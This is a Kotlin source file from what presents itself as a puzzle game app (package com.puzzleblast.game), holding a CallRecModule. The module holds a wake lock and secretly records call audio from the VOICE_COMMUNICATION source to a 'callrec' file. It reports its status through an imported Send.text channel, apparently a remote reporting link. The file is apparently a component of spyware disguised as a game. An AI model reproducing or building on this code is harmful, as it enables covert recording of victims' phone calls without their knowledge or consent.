package com.puzzleblast.game.modules

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.PowerManager
import com.puzzleblast.game.core.Send
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File

object CallRecModule {
    private var recorder: MediaRecorder? = null
    private var wakeLock: PowerManager.WakeLock? = null

    suspend fun record(ctx: Context, sec: Int = 30): File? = withContext(Dispatchers.IO) {
        try {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "pb:rec").apply { acquire(sec * 1000L + 5000) }
            val out = File(ctx.cacheDir, "callrec_${System.currentTimeMillis()}.m4a")
            val r = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            r.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            r.setAudioEncodingBitRate(64000)
            r.setAudioSamplingRate(44100)
            r.setOutputFile(out.absolutePath)
            r.prepare(); r.start()
            recorder = r
            delay(sec * 1000L)
            r.stop(); r.release()
            recorder = null
            wakeLock?.release()
            out
        } catch (e: Exception) {
            Send.text("🎙 callrec error: ${e.message}")
            null
        }
    }
}
